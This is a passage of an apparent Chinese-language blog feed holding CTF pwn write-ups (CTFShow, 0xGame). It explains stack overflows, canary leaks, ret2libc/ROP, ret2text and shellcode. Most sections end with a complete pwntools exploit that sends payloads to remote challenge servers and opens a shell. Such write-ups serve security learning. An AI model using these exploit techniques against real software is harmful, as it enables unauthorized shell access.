class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28063</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br><span class="line"></span><br><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-pwn04"><a href="#4-pwn04" class="headerlink" title="4.pwn04"></a>4.pwn04</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>先checksec</p><p><img src="https://img-blog.csdnimg.cn/2020100514433593.png#pic_center" alt="在这里插入图片描述"></p><p>栈不可执行<br>Canary打开</p><blockquote><p>canary:<br>用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出。</p></blockquote><p>main函数：</p><p><img src="https://img-blog.csdnimg.cn/20201005144542442.png#pic_center" alt="在这里插入图片描述"></p><p>没有线索，跟进vuln函数</p><p><img src="https://img-blog.csdnimg.cn/20201005144639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>看到v3就是canary了<br>也就是下面的 [ebp-0ch]</p><p><img src="https://img-blog.csdnimg.cn/20201005145903257.png#pic_center" alt="在这里插入图片描述"></p><p>在vuln函数中canary赋值给了eax<br>我们可以通过在这个赋值之后下一个断点，来获取canary的值<br>在此之前我们需要知道printf函数的地址，用来找到canary的偏移<br>所以要先在printf函数下面下一个断点<br><code>b printf</code></p><p><img src="https://img-blog.csdnimg.cn/20201005150508325.png#pic_center" alt="在这里插入图片描述"></p><p><code>run</code></p><p><img src="https://img-blog.csdnimg.cn/20201005152146251.png#pic_center" alt="在这里插入图片描述"></p><p>可以看到<br>printf函数的地址是 0xffffd0b0</p><p>然后在canary赋值之后下一个断点<br>ps：在vuln函数和main函数中都有canary的赋值</p><p><img src="https://img-blog.csdnimg.cn/20201005151100579.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201005151126582.png#pic_center" alt="在这里插入图片描述"></p><p>这里需要用main函数里面的（我也不知道为什么。。。<br><code>b *0x080486C9</code></p><p><img src="https://img-blog.csdnimg.cn/20201005152008443.png#pic_center" alt="在这里插入图片描述"></p><p>这样就找到了canary的值<br>之后看printf的地址，找到canary的值，然后算出偏移<br><code>x/40wx 0xffffd0b0</code></p><p><img src="https://img-blog.csdnimg.cn/20201005151654295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>发现0x0x1276e500的偏移为31，所以构造canary的值为%31$x<br>canary的值要靠我们的输入buf来赋值，所以要计算一下buf和v3的偏移 = (0x70-0xC) =100</p><p><img src="https://img-blog.csdnimg.cn/20201005153200798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>最后还有 (0x8+4) = 12 个字节需要覆盖，覆盖返回地址到system函数才能取得shell</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28017</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">leak_canary = <span class="string">&quot;%31$x&quot;</span></span><br><span class="line">p.sendline(leak_canary)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&quot;a&quot;</span> * <span class="number">100</span> + p32(canary) + <span class="string">&quot;b&quot;</span> * <span class="number">12</span> + p32(<span class="number">0x0804859B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-pwn05"><a href="#5-pwn05" class="headerlink" title="5.pwn05"></a>5.pwn05</h2><h3 id="ret2text-32-1"><a href="#ret2text-32-1" class="headerlink" title="ret2text 32"></a>ret2text 32</h3><p>IDA分析一下</p><p><img src="https://img-blog.csdnimg.cn/20201005154604507.png#pic_center" alt="在这里插入图片描述"></p><p>gets函数 明显的溢出<br>双击s</p><p><img src="https://img-blog.csdnimg.cn/20201005154653584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>偏移为 (0x14+4)<br>再 Shift+F12</p><p><img src="https://img-blog.csdnimg.cn/20201005154801510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>找到 /bin/sh </p><p><img src="https://img-blog.csdnimg.cn/20201005154913771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28024</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>) + p32(<span class="number">0x08048486</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-pwn06"><a href="#6-pwn06" class="headerlink" title="6.pwn06"></a>6.pwn06</h2><h3 id="堆栈平衡-64"><a href="#堆栈平衡-64" class="headerlink" title="堆栈平衡 64"></a>堆栈平衡 64</h3><p>64位的pwn05<br>所以和上一题是差不多的<br>不同的是这里要平衡堆栈</p><p><img src="https://img-blog.csdnimg.cn/20201005160148927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>push rbp ：将bp寄存器的值压入栈中<br>然后再看偏移</p><p><img src="https://img-blog.csdnimg.cn/20201005160422216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这里32位是4，而64位则是8</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28070</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>) + p64(<span class="number">0x400577</span>)+ p64(<span class="number">0x400577</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-pwn07"><a href="#7-pwn07" class="headerlink" title="7.pwn07"></a>7.pwn07</h2><h3 id="libc-64"><a href="#libc-64" class="headerlink" title="libc 64"></a>libc 64</h3><p>先checksec一下</p><p><img src="https://img-blog.csdnimg.cn/20201012192733970.png#pic_center" alt="在这里插入图片描述"></p><p>这题和pwn03差的不多<br>pwn03是32bit的，这题是64bit的<br>64比32需要的payload多了一个pop rdi,ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">32</span>位：</span><br><span class="line">payload：<span class="string">&quot;a&quot;</span>*offset + p32(plt) + p32(ret_addr) + p32(got)</span><br><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p32(system_addr) + <span class="string">&quot;AAAA&quot;</span> + p32(str_bin_sh)</span><br><span class="line"><span class="number">64</span>位：</span><br><span class="line">payload：<span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr)</span><br><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)</span><br></pre></td></tr></table></figure><p><code>ROPgadget --binary [file name]</code></p><p><img src="https://img-blog.csdnimg.cn/20201012194105578.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201012194138780.png#pic_center" alt="在这里插入图片描述"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28049</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment">#产生一个对象</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span> <span class="comment"># ROPgadget --binary [file name]</span></span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#elf.symbols[&#x27;a_function&#x27;]  找到 a_function 的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"><span class="comment">#64位payload: &quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>) <span class="comment">#p.recvuntil(some_string) 接收到 some_string 为止</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#p.recvn(N)   接受 N(数字) 字符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x4006E4</span></span><br><span class="line"></span><br><span class="line">libcbase = puts_addr -  <span class="number">0x0809c0</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libcbase + <span class="number">0x04f440</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh = libcbase + <span class="number">0x1b3e9a</span>        <span class="comment"># +libc_Offset的bin/sh</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + ret_addr + pop_rdi + bin_sh + system_addr</span><br><span class="line"><span class="comment">#getshell: b&quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-栈溢出之ret2text"><a href="#8-栈溢出之ret2text" class="headerlink" title="8.栈溢出之ret2text"></a>8.栈溢出之ret2text</h2><h3 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text 64"></a>ret2text 64</h3><p>很简单的一个栈溢出<br>直接IDA分析</p><p><img src="/article/CTFShow_0x1/20201012194826370.png" alt="在这里插入图片描述"></p><p>从main函数跟进到welcome函数<br>get() 很明显的溢出</p><p><img src="/article/CTFShow_0x1/20201012194915979.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>因为是64位的，所以后面要加上8<br>Shift+F12 </p><p><img src="/article/CTFShow_0x1/20201012195035341.png" alt="在这里插入图片描述"></p><p>发现/bin/sh 果然够简单的。。。<br>双击进去</p><p><img src="/article/CTFShow_0x1/20201012195145849.png" alt="在这里插入图片描述"></p><p>再双击</p><p><img src="/article/CTFShow_0x1/20201012195243513.png" alt="在这里插入图片描述"></p><p>找到地址<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28072</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x40063B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Pwn-CTFShow&quot;&gt;&lt;a href=&quot;#Pwn-CTFShow&quot; class=&quot;headerlink&quot; title=&quot;Pwn_CTFShow&quot;&gt;&lt;/a&gt;Pwn_CTFShow&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>Pwn_0xGame_01</title>
    <link href="https://trick.ink/article/Pwn_0xGame_01/"/>
    <id>https://trick.ink/article/Pwn_0xGame_01/</id>
    <published>2021-09-28T19:45:18.692Z</published>
    <updated>2021-07-24T06:31:19.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwn-0xGame-01"><a href="#Pwn-0xGame-01" class="headerlink" title="Pwn_0xGame_01"></a>Pwn_0xGame_01</h1><span id="more"></span><h2 id="1-欢迎来到0xGame平台"><a href="#1-欢迎来到0xGame平台" class="headerlink" title="1.欢迎来到0xGame平台"></a>1.欢迎来到0xGame平台</h2><p><code>nc</code>出flag</p><h2 id="2-帮我取一个题目名称"><a href="#2-帮我取一个题目名称" class="headerlink" title="2.帮我取一个题目名称"></a>2.帮我取一个题目名称</h2><p>ret2text<br>打开IDA分析<br>main函数</p><p><img src="https://img-blog.csdnimg.cn/20201018162746427.png#pic_center" alt="在这里插入图片描述"></p><p>跟进<br>第二个函数</p><p><img src="https://img-blog.csdnimg.cn/20201018162919579.png#pic_center" alt="在这里插入图片描述"></p><p>s栈大小为20h=32<br>函数最后return read了s<br>所以很好写了<br>因为是64位程序，后面再加上8个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>Shift+F12发现/bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20201018163358221.png#pic_center" alt="在这里插入图片描述"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214 &#x27;</span>,<span class="number">10002</span>) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x401172</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-easy-stack"><a href="#3-easy-stack" class="headerlink" title="3.easy_stack"></a>3.easy_stack</h2><p>文件<br>easy_stack.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt; ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────</span><br><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBX  0x56558fb8 ◂— 0x3ec0</span><br><span class="line">&gt; ECX  0xffffffff</span><br><span class="line">&gt; EDX  0xffffffff</span><br><span class="line">&gt; EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br><span class="line">&gt; ESP  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt; EIP  0x56556273 —▸ 0xfffdb8e8 ◂— 0x0</span><br><span class="line">&gt;─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt; ► 0x56556273    call   read@plt &lt;0x56556030&gt;</span><br><span class="line">&gt;   0x56556278    add    esp, 0x10</span><br><span class="line">&gt;   0x5655627b    nop    </span><br><span class="line">&gt;   0x5655627c    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">&gt;   0x5655627f    leave  </span><br><span class="line">&gt;   0x56556280    ret    </span><br><span class="line">&gt;──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt;00:0000│ esp  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt;01:0004│      0xffffcfe4 —▸ 0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;02:0008│      0xffffcfe8 ◂— 0x100</span><br><span class="line">&gt;03:000c│      0xffffcfec —▸ 0x56556234 ◂— 0x2d84c381</span><br><span class="line">&gt;04:0010│ eax  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;... ↓</span><br></pre></td></tr></table></figure><p>► 0x56556273    call   read@plt &lt;0x56556030&gt;<br>调用了read函数，再看看read函数中的三个参数</p><pre><code>read (fd, char *buf , count)</code></pre><p>fd：文件描述符（文件指针） //fd写0,表示标准输入</p><p>buf：指向内存的指针             //也就是把数据写入的起始地址</p><p>count：读取的长度</p><p>再结合文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 00:0000│ esp  0xffffcfe0 ◂— 0x0 </span><br><span class="line">&gt; 01:0004│      0xffffcfe4 —▸ 0xffffcff0◂— 0x0 </span><br><span class="line">&gt; 02:0008│      0xffffcfe8 ◂— 0x100</span><br></pre></td></tr></table></figure><p>然后我们再观察ebp和eax的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br></pre></td></tr></table></figure><p>因为通常返回地址是存在ebp下，所以计算一下偏移量 0xffffd078 - 0xffffcff0 = 0x88<br>read读取的数据长度是0x100<br>0x88 &lt; 0x100<br>所以存在溢出<br>nc连接会回显个地址，并且这个地址是随机的</p><p><img src="https://img-blog.csdnimg.cn/20201018193434919.png#pic_center" alt="在这里插入图片描述"></p><p>我们可以接收这个地址并让程序执行它<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10008</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;magic_address &#x27;</span>) </span><br><span class="line">shell = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>) </span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span>+<span class="number">4</span>) + p32(shell)) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-该怎么起名呢"><a href="#4-该怎么起名呢" class="headerlink" title="4.该怎么起名呢"></a>4.该怎么起名呢</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>题目让我们执行shellcode，但程序是64位的，pwntools生成的shellcode是32位的，所以我们需要设置架构<br>context.arch=’AMD64’ ，否则有可能会报错</p><p>再看IDA</p><p><img src="https://img-blog.csdnimg.cn/20201019195422415.png#pic_center" alt="在这里插入图片描述"></p><p>关键的在下面的buf+32</p><p>所以我们需要填充32个字符之后再送出shellcode</p><p>生成 shellcode</p><blockquote><p>asm(shellcraft.sh())</p></blockquote><p>运行一下文件</p><p><img src="https://img-blog.csdnimg.cn/20201019200641989.png#pic_center" alt="在这里插入图片描述"></p><p>需要在’shellcode’之后再发送payload</p><p>所以要recvuntil(‘shellcode’)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">context.arch = <span class="string">&#x27;AMD64&#x27;</span> </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">32</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;shellcode&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-variable-coverage"><a href="#5-variable-coverage" class="headerlink" title="5.variable_coverage"></a>5.variable_coverage</h2><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>IDA分析下</p><p><img src="https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>程序读取%lld 一个longlong的数，它的长度为8个字节<br>后面判断v5等于0x2333后会调用system函数<br>构造payload = 0x233300000000<br>再看栈</p><p><img src="https://img-blog.csdnimg.cn/20201019210240376.png#pic_center" alt="在这里插入图片描述"></p><p>4个字节的长度刚好是0x 0000 2333 0000 0000<br>也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10007</span>) </span><br><span class="line"></span><br><span class="line">payload =  <span class="built_in">str</span>(<span class="number">0x233300000000</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-Pwn题滞销-帮帮我好吗"><a href="#6-Pwn题滞销-帮帮我好吗" class="headerlink" title="6.Pwn题滞销,帮帮我好吗?"></a>6.Pwn题滞销,帮帮我好吗?</h2><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>IDA打开</p><p><img src="/article/Pwn_0xGame_01/20201022204647356.png" 